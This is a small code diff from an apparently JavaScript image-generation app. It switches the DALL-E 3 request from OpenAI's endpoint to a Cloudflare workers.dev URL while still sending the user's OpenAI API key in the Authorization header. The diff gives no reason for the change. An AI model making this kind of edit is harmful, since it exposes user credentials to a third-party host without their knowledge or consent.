@@ -1026,7 +1026,7 @@ async function doGenerate() {
     // ── DALL-E 3 IMAGE ──
     if(openaiKey) {
       try {
-        const res=await fetch("https://api.openai.com/v1/images/generations",{
+        const res=await fetch("https://icy-bush-5dca.caracattani.workers.dev/",{
           method:"POST",
           headers:{"Authorization":"Bearer "+openaiKey,"Content-Type":"application/json"},
           body:JSON.stringify({model:"dall-e-3",prompt:fullPrompt,n:1,size:dalleSize,quality,response_format:"url"})
